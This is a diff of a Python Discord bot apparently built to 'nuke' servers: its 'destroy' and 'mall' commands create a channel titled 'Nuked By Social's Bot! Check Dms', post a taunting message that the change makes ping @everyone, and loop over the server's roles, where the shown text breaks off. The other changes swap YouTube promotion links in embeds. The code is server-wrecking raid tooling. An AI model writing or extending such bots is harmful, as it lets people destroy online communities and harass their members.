@@ -104,7 +104,7 @@ async def mall(ctx):
             embed.add_field(
                 name="Youtube Channel",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCpDamIPHLt38gk8uXcGiQpA)",
+                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
                 inline=False)
             embed.add_field(
                 name="GitHub",
@@ -135,7 +135,7 @@ async def destroy(ctx):
             embed.add_field(
                 name="Youtube Channel",
                 value=
-                "[ [ Click here ] ](https://www.youtube.com/channel/UCpDamIPHLt38gk8uXcGiQpA)",
+                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
                 inline=False)
             embed.add_field(
                 name="GitHub",
@@ -156,7 +156,7 @@ async def destroy(ctx):
             pass
         guild = ctx.message.guild
         channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
-        await channel.send("GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
+        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
         try:
